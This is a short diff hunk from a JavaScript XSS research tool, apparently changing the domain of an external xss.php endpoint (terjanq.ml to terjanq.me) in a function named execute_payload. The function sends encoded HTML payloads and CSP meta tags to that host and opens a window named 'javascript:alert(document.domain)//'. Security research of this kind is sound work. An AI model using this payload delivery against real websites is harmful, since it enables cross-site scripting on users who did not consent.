@@ -26,7 +26,7 @@ function execute_payload(payload){
         meta += `<meta http-equiv="content-security-policy" content="style-src 'none'">`
     }
 
-    x = open(`https://terjanq.ml/xss.php?html=${enc(meta)}${enc(payload.html)}#${hash}`, 'javascript:alert(document.domain)//')
+    x = open(`https://terjanq.me/xss.php?html=${enc(meta)}${enc(payload.html)}#${hash}`, 'javascript:alert(document.domain)//')
 }
 
 function createPayloads(payloads){
